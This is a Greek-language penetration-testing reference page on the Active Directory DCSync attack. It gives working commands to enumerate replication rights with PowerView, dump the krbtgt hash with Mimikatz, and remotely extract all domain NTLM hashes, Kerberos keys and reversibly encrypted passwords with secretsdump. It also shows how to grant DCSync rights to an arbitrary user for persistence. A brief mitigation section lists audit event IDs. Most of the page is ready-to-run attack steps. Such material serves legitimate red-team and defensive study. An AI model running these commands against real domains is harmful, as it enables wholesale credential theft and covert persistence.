# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Η άδεια **DCSync** υποδηλώνει ότι έχετε αυτές τις άδειες πάνω στο ίδιο το domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.

**Σημαντικές Σημειώσεις σχετικά με το DCSync:**

- Η **επίθεση DCSync προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλους Domain Controllers να αναπαράγουν πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Δεδομένου ότι το MS-DRSR είναι μια έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί ή να απενεργοποιηθεί.
- Από προεπιλογή μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators, και Domain Controllers** έχουν τα απαιτούμενα προνόμια.
- Εάν οποιοιδήποτε κωδικοί πρόσβασης λογαριασμών αποθηκεύονται με αναστρέψιμη κρυπτογράφηση, υπάρχει μια επιλογή στο Mimikatz για να επιστρέψει τον κωδικό πρόσβασης σε καθαρό κείμενο.

### Enumeration

Ελέγξτε ποιος έχει αυτές τις άδειες χρησιμοποιώντας `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Εκμετάλλευση Τοπικά
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Εκμετάλλευση Απομακρυσμένα
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` δημιουργεί 3 αρχεία:

- ένα με τους **NTLM hashes**
- ένα με τα **Kerberos keys**
- ένα με καθαρό κείμενο κωδικούς πρόσβασης από το NTDS για οποιουσδήποτε λογαριασμούς που έχουν ρυθμιστεί με [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) ενεργοποιημένο. Μπορείτε να αποκτήσετε χρήστες με reversible encryption με

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Αν είστε διαχειριστής τομέα, μπορείτε να παραχωρήσετε αυτές τις άδειες σε οποιονδήποτε χρήστη με τη βοήθεια του `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Στη συνέχεια, μπορείτε να **ελέγξετε αν ο χρήστης έχει ανατεθεί σωστά** τα 3 δικαιώματα αναζητώντας τα στην έξοδο του (θα πρέπει να μπορείτε να δείτε τα ονόματα των δικαιωμάτων μέσα στο πεδίο "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Η Πολιτική Ελέγχου για το αντικείμενο πρέπει να είναι ενεργοποιημένη) – Μια ενέργεια πραγματοποιήθηκε σε ένα αντικείμενο
- Security Event ID 5136 (Η Πολιτική Ελέγχου για το αντικείμενο πρέπει να είναι ενεργοποιημένη) – Ένα αντικείμενο υπηρεσίας καταλόγου τροποποιήθηκε
- Security Event ID 4670 (Η Πολιτική Ελέγχου για το αντικείμενο πρέπει να είναι ενεργοποιημένη) – Οι άδειες σε ένα αντικείμενο άλλαξαν
- AD ACL Scanner - Δημιουργήστε και συγκρίνετε αναφορές ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
